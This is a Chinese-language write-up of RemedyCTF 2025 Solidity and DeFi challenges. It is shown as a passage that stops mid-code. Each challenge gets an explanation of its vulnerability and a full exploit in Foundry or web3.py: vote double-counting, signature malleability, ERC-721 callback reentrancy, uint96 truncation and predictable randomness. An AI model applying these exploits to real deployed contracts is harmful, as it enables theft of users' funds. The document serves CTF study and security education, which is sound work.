# RemedyCTF 2025 Solidity & DeFi 相关题目分析-先知社区

> **来源**: https://xz.aliyun.com/news/17080  
> **文章ID**: 17080

---

## TL;DR

> 赛事官网：<https://ctf.r.xyz>
>
> Github：<https://github.com/Hexens/remedy-ctf-2025>
>
> ChainLight writeup：<https://github.com/theori-io/ctf/tree/master/2025/remedyctf>

RemedyCTF 2025 是专注web3安全的CTF赛事，题目质量高，且贴近实际场景，非常有学习意义。本文复现了9道与Solidity & DeFi相关的题目，深入分析了题目漏洞点及攻击原理，并总结归纳了关键词。部分题目思路来自ChainLight队伍的writeup

## 0x00 Diamond Heist

### 关键词

代币重复投票、CREATE2、UUPSUpgrade

### 题目概览

> Agent, we are in desperate need of your help. The King's diamonds have been stolen by a DAO and are locked in a vault. They are currently voting on a proposal to burn the diamonds forever!
>
> Your mission, should you choose to accept it, is to recover all diamonds and keep them safe until further instructions.
>
> Good luck.
>
> This message will self-destruct in 3.. 2.. 1..

* `Diamond.sol`ERC20代币，表示题目情景中的钻石
* `Vault.sol`锁住Diamond的金库，`hexensCoin`投票可以进行特权操作`governanceCall`，合约可`UUPS`升级
* `VaultFactory.sol`Vault工厂合约，指明Vault是由`ERC1967Proxy`部署的，使用`salt`即`create2`可预先计算部署地址
* `HexensCoin.sol`依托于`HexensCoin`代币的去中心化投票系统
* `Burner.sol`执行selfdestruct销毁Diamond

Challenge合约创建了以上各合约，然后把Diamond锁进了Vault，我们的任务就是要把Diamond取出来。player可以调用claim函数获得初始HexensCoins

### 攻击路径

首先关注`HexensCoin.sol`，投票系统会验证投票者HexensCoin代币，但并没有将代币锁定或销毁，所以只要将代币转移到另一个人手上再次投票，票数就可以累加，达到刷票的效果，从而就有了调用vault合约中特权操作`governanceCall`的能力

Vault合约是可升级的，但合约重写了`_authorizeUpgrade`函数，要求合约中`IERC20(diamond).balanceOf(address(this)) == 0`才能upgrade，所以我们必须先`governanceCall`调用`burn`函数将Diamond转移

现在问题就来了：Diamond转移后Burner合约直接selfdestruct，我们如何还能拿到Diamond呢？

下面到了关键部分，上面说过，Vault合约创建使用了salt即`CREATE2`，故地址确定。而对于普通`CREATE`创建出的Burner合约，它的地址取决于deployer（Vault合约）地址和交易次序（第几个交易），deployer地址不会变，交易次序也能不变吗？其实只要Vault合约也selfdestruct然后再重新创建即可

> 注：原版`paradigmctf`环境不支持`hard_fork`参数，出题人在`challenge.py`中使用的`hardfork="shanghai"`不起作用，默认本地docker环境anvil的evm version会是cancun，而在cancun版本中selfdestruct之后并不会允许CREATE2部署新合约在相同地址上（详见[EIP-4758](https://eips.ethereum.org/EIPS/eip-4758#backwards-compatibility)）

### Exploit

NewVault合约：

```
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.13;

import "./openzeppelin-contracts/interfaces/IERC20.sol";
import "./openzeppelin-contracts/interfaces/IERC3156FlashBorrower.sol";
import "./openzeppelin-contracts-upgradeable/proxy/utils/Initializable.sol";
import "./openzeppelin-contracts-upgradeable/proxy/utils/UUPSUpgradeable.sol";
import "./openzeppelin-contracts-upgradeable/access/OwnableUpgradeable.sol";

import "./Diamond.sol";
import "./Burner.sol";
import "./NewBurner.sol";
import "./HexensCoin.sol";

contract NewVault is Initializable, UUPSUpgradeable, OwnableUpgradeable {

    uint constant public AUTHORITY_THRESHOLD = 100_000 ether;

    Diamond diamond;
    HexensCoin hexensCoin;

    function initialize(address diamond_, address hexensCoin_) public initializer {
        __Ownable_init();
        diamond = Diamond(diamond_);
        hexensCoin = HexensCoin(hexensCoin_);
    }

    function governanceCall(bytes calldata data) external {
        require(msg.sender == owner() || hexensCoin.getCurrentVotes(msg.sender) >= AUTHORITY_THRESHOLD);
        (bool success,) = address(this).call(data);
        require(success);
    }

    function burn(address token, uint amount) external {
        require(msg.sender == owner() || msg.sender == address(this));
        Burner burner = new Burner();
        IERC20(token).transfer(address(burner), amount);
        burner.destruct();
    }
  
    function _authorizeUpgrade(address) internal override view {
        require(msg.sender == owner() || msg.sender == address(this));
        require(IERC20(diamond).balanceOf(address(this)) == 0);
    }

    function destruct() public {
        selfdestruct(payable(address(this)));
    }

    function hack(address player) public {
        NewBurner newBurner = new NewBurner(address(diamond));
        newBurner.hack(player);
    }
}

```

NewBurner合约：

```
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.13;

import "./Diamond.sol";

contract NewBurner {
    Diamond public diamond;
    constructor(address _diamond) {
        diamond = Diamond(_diamond);
    }

    function hack(address player) external {
        diamond.transfer(player, 31337);
    }
}
```

攻击脚本：

```
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.13;

import {Script} from "forge-std/Script.sol";
import {console} from "forge-std/console.sol";

import "../src/NewVault.sol";
import "../src/Challenge.sol";

contract Attack is Script {
    address public challengeAddr;
    Challenge public challenge;
    HexensCoin public coin;
    Vault public vault;
    VaultFactory public vaultFactory;
    Diamond public diamond;
    address[] public helpers;
    address public player;
    NewVault public newVault;

    function setUp() public {
        challengeAddr = vm.envAddress("CHALL");
        challenge = Challenge(challengeAddr);
        coin = HexensCoin(challenge.hexensCoin());
        vault = Vault(challenge.vault());
        vaultFactory = VaultFactory(challenge.vaultFactory());
        diamond = Diamond(challenge.diamond());
        player = challenge.PLAYER();
    }

    function run() public {
        vm.startBroadcast(vm.envUint("PRIV"));
        // create helpers contract
        for (uint256 i = 0; i < 10; i++) {
            helpers.push(address(new Helper()));
        }

        // claim initial hexenscoins
        challenge.claim();

        // get votes
        for (uint256 i = 0; i < 10; i++) {
            coin.transfer(helpers[i], 10_000 ether);
            Helper(helpers[i]).delegateVote(address(coin), player);
        }

        // transfer diamont, so that we can upgrade vault
        vault.governanceCall(abi.encodeWithSignature("burn(address,uint256)", address(diamond), 31337));
    
        // selfdestruct vault to touch Burner address
        newVault = new NewVault();
        vault.governanceCall(abi.encodeWithSignature("upgradeTo(address)", address(newVault)));
        (bool success,) = address(vault).call(abi.encodeWithSignature("destruct()"));
        require(success, "Call to destruct failed");

        // recreate vault contract
        newVault = new NewVault();
        vault =
            vaultFactory.createVault(keccak256("The tea in Nepal is very hot. But the coffee in Peru is much hotter."));
    
        // call initialize to be owner, so that no need to get votes 
        vault.initialize(address(diamond), address(coin));

        // final upgrade and call hack
        vault.governanceCall(abi.encodeWithSignature("upgradeTo(address)", address(newVault)));
        (success,) = address(vault).call(abi.encodeWithSignature("hack(address)", address(player)));
        require(success, "Call to hack failed");
        vm.stopBroadcast();
    }
}

contract Helper {
    HexensCoin coin;

    function delegateVote(address coin_address, address target) public {
        coin = HexensCoin(coin_address);
        coin.delegate(target);
        coin.transfer(msg.sender, 10_000 ether);
    }
}
```

## 0x01 Casino Avengers

### 关键词

紧凑签名复用、函数返回值信息泄漏

### 题目概览

> After numerous attacks by Alice on Bob, he's now planning his revenge. By tracing his stolen funds, Bob has uncovered Alice's latest scheme: a rigged Casino smart contract.  
> You and Bob have a long history together. While Bob may not be an expert in hacking, he has turned to his most trusted ally - you - for assistance. Although the funds are already locked in the contract and it seems impossible to retrieve them, as a team you are determined to find a way...

`Casino.sol`中实现了一个赌博协议，用户可以deposit存入资金，withdraw取出资金，bet进行赌博，pause和reset为特权操作，可由管理员（signer）发起

合约存在一个后门，就是withdraw函数中使用了`reciever`（故意拼写错误），这个变量声明在`ICasino`合约里：

```
contract ICasino {
    address internal constant reciever = address(0x1337);
}
```

这会导致所有正常的取款都会失败，用户永远也拿不回自己的钱。我们的任务是找到漏洞把钱拿回来

### 攻击路径

首先，Casino合约处于paused状态，想要进行其他交互，首先得把合约取消暂停。想要使用`pause`函数，就要通过签名校验`_verifySignature`。这里使用了openzeppelin的`ECDSA.recover`库函数，并对signature去重，但这个库支持compact signature（详见[ERC-2098](https://eips.ethereum.org/EIPS/eip-2098)），合约并没有考虑到，所以我们可以从区块历史中拿到用过的签名，变形成一个新的签名，就能pause、reset了

下一步就是从合约里偷钱了，重点在`bet`函数。对于随机数生成，虽然使用链上数据肯定不合适，但`gasleft`我们并不好预测，问题出在函数返回值，返回了是否成功，泄漏了信息。我们完全可以在不成功时选择revert，只有在成功时正常执行，这就能不断积累我们奖金，每次翻一倍，最后调用`reset`函数拿到资金。由于reset函数中使用`~~~`对用户资金做奇怪的计算，所以我们需要多加调试

### Exploit

使用web3.py从区块历史中提取出使用过的签名，并变形成紧凑签名：

```
from web3 import Web3
from eth_utils import function_signature_to_4byte_selector
import os

rpc = os.environ.get("RPC")
w3 = Web3(Web3.HTTPProvider(rpc))

PAUSE_SIG = function_signature_to_4byte_selector('pause(bytes,bytes32)')
RESET_SIG = function_signature_to_4byte_selector('reset(bytes,address,uint256,bytes32)')

def get_target_txs(start_block, end_block):
    pause_tx = None
    reset_tx = None
  
    for block_num in range(start_block, end_block + 1):
        block = w3.eth.get_block(block_num, True)
        for tx in block.transactions:
            # 检查函数选择器
            # print(tx['input'])
            if tx['input'].startswith(PAUSE_SIG):
                pause_tx = tx
            elif tx['input'].startswith(RESET_SIG):
                reset_tx = tx
    return pause_tx, reset_tx

def extract_sig(signature):
    r = "0x" + signature[0:64]
    s = "0x" + signature[64:128]
    v = "0x" + signature[128:130]
    return r, s, v

# Assume yParity is 0 or 1, normalized from the canonical 27 or 28
def to_compact(r, s, yParity):
    return {
        "r": r,
        "yParityAndS": (yParity << 255) | s
    }

# 获取最新区块
latest = w3.eth.block_number
pause_tx, reset_tx = get_target_txs(0, latest)

# function pause(
#         bytes memory signature,
#         bytes32 salt
#     )
if pause_tx:
    data = pause_tx['input'].hex()[8:]
    salt = "0x" + data[64: 64+64]
    sig = data[64*3: 64*3 + 64*3]
    r, s, v = extract_sig(sig)
    vv = 0 if eval(v) == 27 else 1
    res = to_compact(eval(r), eval(s), vv)
    nr1 = res['r']
    nsv1 = res['yParityAndS']
    nsig = hex(nr1)+hex(nsv1)[2:]
    print("compact sig:", nsig[2:])
  
# function reset(
#         bytes memory signature,
#         address payable receiver,
#         uint256 amount,
#         bytes32 salt
#     )
if reset_tx:  
    data = reset_tx['input'].hex()[8:]
    salt = "0x" + data[64*3: 64*3+64]
    sig = data[64*5: 64*5+ 64*3]
    r, s, v = extract_sig(sig)
    vv = 0 if eval(v) == 27 else 1
    res = to_compact(eval(r), eval(s), vv)
    nr1 = res['r']
    nsv1 = res['yParityAndS']
    nsig = hex(nr1)+hex(nsv1)[2:]
    assert len(nsig) == 130, nsig
    print("compact sig:", nsig[2:])

```

攻击合约：

```
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.28;

import {Script} from "forge-std/Script.sol";
import {console} from "forge-std/console.sol";
import "../src/Challenge.sol";

contract Attack {
    address public chall;
    Challenge public challenge;
    Casino public casino;
    address public player;
    address public system;

    constructor(address _chall) {
        chall = _chall;
        challenge = Challenge(chall);
        casino = Casino(challenge.CASINO());
        player = challenge.PLAYER();
    }

    function bet(uint256 amount) public {
        bool success = casino.bet(amount);
        require(success);
    }

    function run() public {
        bytes memory pauseSignature = hex"4ef6d454c985b8b8b4364e281a1fb1d668c75eb572413885b8f87656bd338e1bba5f0e59d98cb41ab814f447e2e9ed3eccddc5c87b04e255ad4fb79f3c7833c3";
        bytes memory resetSignature = hex"977ee1e8810ef04448fc429d564ee17813a871f15cba1d03500202354a14ef70c29c93aacd025da9cff0de4c991cc54b5329cad68fe853cd4d6f14fd0cdf519e";
        bytes32 pauseSalt = 0x5365718353c0589dc12370fcad71d2e7eb4dcb557cfbea5abb41fb9d4a9ffd3a;
        bytes32 resetSalt = 0x7867dc2b606f63c4ad88af7e48c7b934255163b45fb275880b4b451fa5d25e1b;
        system = casino.holders(0);

        casino.pause(pauseSignature, pauseSalt);
        casino.deposit{value: 0.5 ether}(address(this));

        uint256 balance = 0.5 ether;
        uint256 betN = 0.5 ether;
        uint256 cnt = 0;
        while ((~~~balance) != 99.5 ether) {
            if (cnt == 197) {
                betN = 0xfffffffffffffffffffffffffffffffffffffffffffffffa9b28fd2c70a1ffff - 100433627766186892221372630771322662657637687111424552206336000000000000000000;
            }
            (bool success, )= address(this).call(abi.encodeWithSignature("bet(uint256)", betN));
            balance = casino.balances(address(this));
            betN = balance;
            if (success) {
                cnt += 1;
            }
        }
        casino.reset(resetSignature, payable(system), 1 ether, resetSalt);
        selfdestruct(payable(player));
    }
    fallback() payable external {}
    receive() payable external {}
}

contract Solve is Script {
    Attack public attack;
    function run() public {
        vm.startBroadcast(vm.envUint("PRIV"));
        attack = new Attack(vm.envAddress("CHALL"));
        payable(address(attack)).transfer(0.8 ether);
        attack.run();
        vm.stopBroadcast();
    }
}
```

## 0x02 Lockdown

### 关键词

ERC-721 `SafeTransferFrom` 回调函数

### 题目概览

> “The last audit told us we didn't have enough reentrancy locks, so we put them everywhere. We're safe now, right?”
>
> Goal: Drain the Marketplace contract of all CUSDC and as much USDC as you can.

`LockToken.sol`中定义了一种ERC-721代币LCK，重点关注`_beforeTokenTransfer`函数，在发送方或接收方为`_marketplace`时会有stake或unstake的特殊效果。`LockMarketplace.sol`中使用LCK作为质押凭证，用户可以通过存入USDC铸造LCK，每一个LCK相当于是一张银行卡，可以质押其中USDC获得收益，USDC会被兑换为CUSDC，作为合约收益来源。用户可以随时解质押、将CUSDC兑换为USDC并取出

这是一个典型的DeFi项目，我们的任务是掏空合约，拿走所有USDC和CUSDC

### 攻击路径

题目描述中提到关于重入锁的内容，我们就要着重去看可能发生重入的代码。合约中没有底层call操作，那么很有可能存在一些回调函数。关注合约中的transfer系列函数，可以发现ERC-721`safeTransferFrom`函数要求，如果接收方地址是合约，则必须实现`onERC721Received`回调函数，这就是我们的突破口

接下来就要思考，如果在`onERC721Received`回调中安排一些恶意操作，能否导致我们想要的结果？

可以插入操作的回调位于`unStake`函数中，下一句将会执行`_swapCUSDCforUSDC(_prevOwners[tokenId], tokenId);`，这里使用的是token的prevOnwer，而redeem操作时`_cusdc.redeem(_cUSDCInterest[_iLockToken.ownerOf(tokenId)])`使用的是现owner，在预期情况下，这两个owner都是解质押的用户。但如果用户A在收到代币的回调函数中，将代币发给用户B，用户B收到马上再发回给用户A，prevOwner就成了用户B，而owner是用户A

这直接导致了`_cUSDCInterest`数组取值的差异，redeem时使用用户A的余额，但扣除余额是却扣除的是用户B，用户B余额本身是0，由于合约减法保护逻辑不会revert，返回依旧是0，从而用户A可以无限redeem，积累reward

后续就可以不断偷出合约中的资金，但不能让合约不够付奖励而revert，这需要仔细调试

### Exploit

完整EXP；

```
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Script} from "forge-std/Script.sol";
import {console} from "forge-std/console.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";

import "../src/Challenge.sol";

contract Solve is Script {
    IERC20 public constant USDC = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
    IERC20 public constant CUSDC = IERC20(0x39AA39c021dfbaE8faC545936693aC917d5E7563);
    address public constant COMPTROLLER = 0x3d9819210A31b4961b30EF54bE2aeD79B9c9Cd3B;

    address public chall;
    address public player;
    Challenge public challenge;
    LockMarketplace public marketplace;
    LockToken public token;
    Attack public attack;
    Attack public attack2;
    Helper public helper;
    Helper public helper2;
    uint256 public tokenId = 2;

    function setUp() public {
        chall = vm.envAddress("CHALL");
        challenge = Challenge(chall);
        marketplace = LockMarketplace(challenge.LOCK_MARKETPLACE());
        token = LockToken(challenge.LOCK_TOKEN());
        player = challenge.PLAYER();
        console.log("player addr:", player);
        console.log("market addr:", address(marketplace));
    }

    function run() public {
        vm.startBroadcast(vm.envUint("PRIV"));
        helper = new Helper(chall);
        // helper2 = new Helper(chall);
        uint256[] memory max = new uint256[](10);
        max[0] = 5e11;
        max[1] = 1e10;
        max[2] = 1e9;
        address oldAttack = address(0);
        for (uint i = 0; i < 3; i++){
            if (i == 0) {
                attack = new Attack(chall, address(helper), 0);
            } else {
                attack = new Attack(chall, address(helper), tokenId);
            }
            if (oldAttack != address(0)) {
                token.transferFrom(oldAttack, address(attack), tokenId);
            }
            USDC.transfer(address(attack), 500e6);   
            attack.run(max[i]);
            oldAttack = address(attack);
        }//999319997944

        vm.stopBroadcast();
    }
}

contract Attack is IERC721Receiver {
    IERC20 public constant USDC = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
    IERC20 public constant CUSDC = IERC20(0x39AA39c021dfbaE8faC545936693aC917d5E7563);
    address public constant COMPTROLLER = 0x3d9819210A31b4961b30EF54bE2aeD79B9c9Cd3B;

    address public chall;
    address public player;
    Challenge public challenge;
    LockMarketplace public marketplace;
    LockToken public token;
    uint256 public tokenId;
    Helper public helper;
    bool hack;

    constructor(address _chall, address _helper, uint256 _tokenId) {
        chall = _chall;
        challenge = Challenge(chall);
        marketplace = LockMarketplace(challenge.LOCK_MARKETPLACE());
        token = LockToken(challenge.LOCK_TOKEN());
        player = challenge.PLAYER();
        helper = Helper(_helper);
        tokenId = _tokenId;
    }

    function run(uint256 _max) public {
        USDC.approve(address(marketplace), 1e20);
        if (tokenId == 0){
            tokenId = marketplace.mintWithUSDC(address(this), 500e6);
        } else {
            marketplace.depositUSDC(tokenId, USDC.balanceOf(address(this)));
        }

        uint256 stakeAmount = 0;
    
        while (true) {
            stakeAmount = marketplace.getDeposit(tokenId);
            if (stakeAmount > _max) {
                break;
            }
            token.approve(address(marketplace), tokenId);
            marketplace.stake(tokenId, stakeAmount);

            hack = true;
            helper.hackNext();
            marketplace.unStake(address(this), tokenId);

            token.approve(address(helper), tokenId);
            helper.getReward(tokenId, address(this));
            if (USDC.balanceOf(address(this)) >= 1e12) break;
        
            USDC.approve(address(marketplace), USDC.balanceOf(address(this)));
            marketplace.depositUSDC(tokenId, USDC.balanceOf(address(this)));
        }
        marketplace.withdrawUSDC(tokenId, marketplace.getDeposit(tokenId));
        USDC.transfer(player, USDC.balanceOf(address(this)));
        token.approve(player, tokenId);
    }

    function onERC721Received(
        address _operator,
        address _from,
        uint256 _tokenId,
        bytes calldata _data
    ) external returns (bytes4) {
        if (_from == address(marketplace) && hack == true) {
            token.safeTransferFrom(address(this), address(helper), _tokenId);
            hack = false;
        }
        return IERC721Receiver.onERC721Received.selector;
    }
}

contract Helper is IERC721Receiver {
    IERC20 public constant USDC = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);

    address public chall;
    address public player;
    Challenge public challenge;
    LockToken public token;
    LockMarketplace public marketplace;
    bool hack;

    constructor(address _chall) {
        chall = _chall;
        challenge = Challenge(chall);
        player = challenge.PLAYER();
        marketplace = LockMarketplace(challenge.LOCK_MARKETPLACE());
        token = LockToken(challenge.LOCK_TOKEN());
    }

    function getReward(uint256 tokenId, address _attack) public {
        uint256 rewardAmount = marketplace.getAvailableRewards(address(this));
        if (rewardAmount > 0) {
            marketplace.redeemCompoundRewards(tokenId, rewardAmount);
        }
        USDC.transfer(_attack, USDC.balanceOf(address(this)));
    }

    function hackNext() public {
        hack = true;
    }

    function onERC721Received(
        address operator,
        address from,
        uint256 tokenId,
        bytes calldata data
    ) external returns (bytes4) {
        if (hack == true) {
            token.transferFrom(address(this), from, tokenId);
            hack = false;
        }
        return IERC721Receiver.onERC721Received.selector;
    }
}
```

## 0x03 Frozen Voting

### 关键词

零地址检查缺失

### 题目概览

> In this system, voting NFTs are equipped with varying levels of voting power, and one particular NFT holds super voting power. After minting, this powerful NFT is fortunately delegated to the player. To solve this challenge, players with a normal NFT must freeze the super voting power NFT.

`VotingERC721.sol`构建了一个基于ERC-721代币的投票系统，有两个代币`NORMAL_ID`和`SUPER_ID`，分别有着不同的voting power。题目开始时，player拥有`NORMAL_ID`，且`SUPER_ID`delegate给了player。我们的目标是将`SUPER_ID`的代币锁死，`SUPER_ID`的owner既不能重新delegate给其他人，也不能把代币发送给别人

### 攻击路径

想要锁死代币，就是要让重新delegate / transfer的操作全部revert。简单浏览一下合约，最简单的方式就是让减法操作出现溢出，如何操作呢？

关注`delegate`和`delegateBySig`两个函数，实现了同样的功能，不同的是，一个直接使用`msg.sender`，一个使用`signature`鉴权。然而`delegateBySig`却漏写了一个检查，即`delegatee == address(0)`的情况。如果player`delegate(address(0))`会发生什么？

`delegate(address(0))`时会减去一份`NORMAL_ID`的投票权重，但其他地方都使用`delegates`函数检查delegatee，当`_delegates`数组值为0时返回`delegator`本身，这意味着，当再次delegate或者tranfer token时，可以再次减去`NORMAL_ID`的投票权重

最开始时，player拥有一份`NORMAL_ID`+一份`SUPER_ID`的投票权重，此时已经减去两份`NORMAL_ID`的投票权重，当`SUPER_ID`的owner进行重新delegate或transfer代币操作时，本来要减去一份`SUPER_ID`的投票权重，此时已不够减，势必revert，达成目标

### Exploit

完整EXP：

```
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.13;

import {Script} from "forge-std/Script.sol";
import {console} from "forge-std/console.sol";
import "forge-std/Vm.sol";

import "../src/Challenge.sol";

contract Attack is Script {
    uint256 public constant NORMAL_ID = 123;
    address public chall;
    address public player;
    uint256 public playerPRIV;
    Challenge public challenge;
    VotingERC721 public votingToken;
    Vm.Wallet public helper;

    struct Checkpoint {
        uint256 fromBlock;
        uint256 votes;
    }

    function setUp() public {
        chall = vm.envAddress("CHALL");
        challenge = Challenge(chall);
        votingToken = challenge.votingToken();
        player = challenge.PLAYER();
        helper = vm.createWallet("helper");
        playerPRIV = vm.envUint("PRIV");
        console.log("player addr:", player);
    }

    function run() public {
        vm.startBroadcast(playerPRIV);
        uint256 nonce = 0;
        uint256 expiry = block.timestamp + 1 days;
        bytes32 domainSeparator = keccak256(abi.encode(votingToken.DOMAIN_TYPEHASH(), keccak256(bytes(votingToken.name())), block.chainid, address(votingToken)));
        bytes32 structHash = keccak256(abi.encode(votingToken.DELEGATION_TYPEHASH(), address(0), nonce, expiry));
        bytes32 digest = keccak256(abi.encodePacked("\x19\x01", domainSeparator, structHash));
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(playerPRIV, digest);
        votingToken.delegateBySig(address(0), nonce, expiry, v, r, s);

        votingToken.transferFrom(player, helper.addr, NORMAL_ID);

        vm.stopBroadcast();
    }
}
```

## 0x04 Rich Man' s Bet

### 关键词

空数组 / 空循环 检查缺失、错误数据类型转换

### 题目概览

> "Power to the people? What a joke... Only the rich deserve power!" That's what the developer of this bridge had in mind when creating it. For him, being rich is proof of intelligence and wisdom. Therefore, for the modest price of 1000 ETH, anyone can become a validator and have a say in the bridge's configuration.  
> He also truly believes that poor people are stupid—they will never understand the "rules" of this society, and that's why they are poor. To mock them, he even implemented this challenge: anyone who can solve it will take the entire bridge balance with them!  
> What arrogance... He forgot that there are people out there who don't understand the rules simply because they don't play by them. We call them hackers.

`AdminNFT.sol`创建了一个`ERC1155`代币，且存在和`Bridge`合约的特权交互

`Bridge`合约主要有两套功能：

1. `bridgeSettingValidators`根据`validatorWeights`加权投票，若权重过半可更新Bridge Setting
2. `withdrawValidators`投票，若人数过半可触发withdraw

我们的目标是拿走Bridge合约中的所有ETH

### 攻击路径

无论是想更新bridge setting，还是想withdrawETH，我们都得先成为`Validator`。简单浏览后可以发现，只有接受AdminNFT的两个回调函数`onERC1155Received`和`onERC1155BatchReceived`会添加用户到`bridgeSettingValidators`，得从这两个函数入手

`onERC1155BatchReceived`中存在一个巨大的问题：没有检查`ids.length`为0的情况。如果传入空数组，仍会把`from`push进`bridgeSettingValidators`，这使得任何人都可以随意变成`bridgeSettingValidator`，不过只有较低的权重

想要控制至少一半的权重，创建更多的账户有些麻烦。`changeBridgeSettings`函数中累加`accumulatedWeight`时还存在一个问题：对于重复签名者的检验，只要求相邻两个签名者不一致，只要我们把两个相同的签名交替重复，就能轻松绕过这个检查，无限叠加权重。于是我们就可以真正更新Bridge Setting

更新Bridge Setting时，更改合约地址其实没有意义，因为我们要从这份Bridge合约的这个地址偷钱，更改`Threshold`会有什么效果吗？`Threshold`控制着`withdrawValidators`投票成立的人数，且我们根本没办法获得`withdrawValidator`的身份，这个`Threshold`就是唯一的突破口

设置`Threshold`的值为多少是个重要的点，合约要求`newThreshold`必须大于1。但这却还有个巨大的问题，传入的`newThreshold`类型为`uint256`，但实际update时却转换了单位：`threshold = uint96(newThreshold);`。所以只要我们传入`2**96`，最后`Threshold`就会因精度损失变成0

最后我们进行`withdrawEth`时，只要传入空`signatures`数组跳过循环，就能满足条件，成功取款

### Exploit

完整EXP：

```
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import {Script} from "forge-std/Script.sol";
import {console} from "forge-std/console.sol";
import "forge-std/Vm.sol";
import "../src/openzeppelin-contracts/utils/cryptography/ECDSA.sol";

import "../src/Challenge.sol";

contract Attack is Script {
    using ECDSA for bytes;
    using ECDSA for bytes32;
    address public challengeAddr;
    address public player;
    Challenge public challenge;
    AdminNFT public nft;
    Bridge public bridge;
    VmSafe.Wallet public helper_wallet;

    function setUp() public {
        challengeAddr = vm.envAddress("CHALL");
        challenge = Challenge(challengeAddr);
        player = challenge.PLAYER();
        nft = AdminNFT(challenge.ADMIN_NFT());
        bridge = Bridge(challenge.BRIDGE());
        helper_wallet = vm.createWallet("helper");
    }

    function run() public {
        vm.startBroadcast(vm.envUint("PRIV"));
        payable(helper_wallet.addr).transfer(0.5 ether);
        vm.stopBroadcast();

        vm.startBroadcast(helper_wallet.privateKey);
        helperGetValidator();
        vm.stopBroadcast();

        vm.startBroadcast(vm.envUint("PRIV"));
        solveStage();
        getValidator();
        changeThreshold();
        withdrawAll();
        vm.stopBroadcast();
    }

    function solveStage() public {
        challenge.solveStage1(6);
        challenge.solveStage2(1, 5959);
        challenge.solveStage3(1, 0, 2);
        bridge.verifyChallenge();
    }

    function getValidator() public {
        uint256[] memory ids = new uint256[](1);
        uint256[] memory amounts = new uint256[](1);
        nft.safeBatchTransferFrom(address(player), address(bridge), ids, amounts, "");
    }

    function helperGetValidator() public {
        uint256[] memory ids = new uint256[](1);
        uint256[] memory amounts = new uint256[](1);
        nft.safeBatchTransferFrom(helper_wallet.addr, address(bridge), ids, amounts, "");
    }

    function changeThreshold() public {
        bytes memory message = abi.encode(address(challenge), address(nft), 2**96);
        bytes32 messageHash =  message.toEthSignedMessageHash();
    
        (uint8 v1, bytes32 r1, bytes32 s1) = vm.sign(vm.envUint("PRIV"), messageHash);
        (uint8 v2, bytes32 r2, bytes32 s2) = vm.sign(helper_wallet, messageHash);
        bytes[] memory signatures = new bytes[](200);
        for (uint i = 0; i < 200; i += 2) {
            signatures[i] = abi.encodePacked(r1, s1, v1);
            signatures[i + 1] = abi.encodePacked(r2, s2, v2);
        }
        console.log(signatures.length);
        bridge.changeBridgeSettings(message, signatures);
    }

    function withdrawAll() public {
        bridge.withdrawEth("hacked", new bytes[](0), address(this), 99999 ether, "");
        selfdestruct(payable(player));
    }

}

```

## 0x05 Not a Very Lucky Token

### 关键词

可预测随机数、Uniswap V2

### 题目概览

> You start with 1 ETH and a questionable token that offers a maybe +5% gain or a definite -10% each time you transfer it.  
> There’s a Uniswap pool (ETH / Lucky Token) and a massive vault bursting with tokens.  
> Your Master Plan?
>
> * Drain the pool’s ETH until its balance falls below 1 ETH (muahahaha!).
> * Walk away with over 10 ETH in your own pocket, proving you’re the luckiest one around.

`LuckyToken.sol`构建了一个`ERC20`代币，重点关注`_transer`函数，在每次transfer过程中都会生成一个随机数，根据随机数计算是赢得（mint）一些代币，还是失去（burn）一些代币。还有一个是`openTrading`函数，会将合约剩余的代币充入uniswap V2池子中，我们的目标就是洗劫池子中的ETH

`LockStaking`合约是一个质押复利的系统，重点在于有锁定期，不能提前取出。`TeamVault`合约是在`LuckyToken`的`constructor`中创建的，重点关注`release`函数，会将代币放入`lockStaking`质押，`withdraw`函数`require(block.timestamp > 1737964800)`在当时比赛过程中均不可调用，不用考虑

### 攻击路径

Lucky Token的ICE和FIRE机制依赖于随机数，而这个随机数显然可预测，所以我们希望一直ICE增加代币。可是合约有`totalAmountMinted + pendingAmount < totalAmountBurned`的限制，即ICE代币数量要小于等于FIRE代币数量。想要获得一大笔代币，就必须先烧掉一大笔代币，如何做到呢？

这时我们想到了Team Vault，这里面就有一大笔代币，但是`token.addSpecialReceiver(address(lockStaking), true)`使这笔钱不参与ICE / FIRE。事实上，我们能干扰白名单添加的过程，因为在`_addSpecialReceiver`函数中，会检查`balanceOf(_user)`，只有balance为0时才会被添加白名单

所以我们只需在添加白名单之前给这个地址转入一点代币即可，而`lockStaking`是通过salt部署的，即CREATE2，所以地址可预测，正好符合我们的需要。干扰添加白名单之后，我们需要控制随机数，让team vault的代币大量FIRE，即可让我们自己不断ICE增加代币。当拥有足够Lucky Token后，我们去uniswap V2池子全换成ETH即可

> 注：这个题目出得不好的点在于，uniswap V2池子未被添加为special receiver，最后交换出ETH时仍可能FIRE，导致交换错误，且不好排查，徒增无意义的工作量

### Exploit

```
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.28;

import {Script} from "forge-std/Script.sol";
import {console} from "forge-std/console.sol";
import "forge-std/Vm.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

import "../src/Challenge.sol";
import "../src/LockStaking.sol";
import "../src/LuckyToken.sol";
import "../src/TeamVault.sol";
import "../src/interfaces/IUniswapV2Pair.sol";
import "../src/interfaces/IUniswapV2Router02.sol";

contract Wrapper is Script {
    address public chall;
    address public player;
    address public WETH;
    Challenge public challenge;
    LuckyToken public token;
    TeamVault public vault;
    Vm.Wallet public helper;
    IUniswapV2Pair public pair;
    IUniswapV2Router01 public router;
    Attack public attack;

    function setUp() public {
        chall = vm.envAddress("CHALL");
        challenge = Challenge(chall);
        token = LuckyToken(challenge.TOKEN());
        player = challenge.PLAYER();
        WETH = challenge.WETH();
        helper = vm.createWallet("helper");
        vault = TeamVault(token.teamVault());
        pair = IUniswapV2Pair(token.uniswapV2Pair());
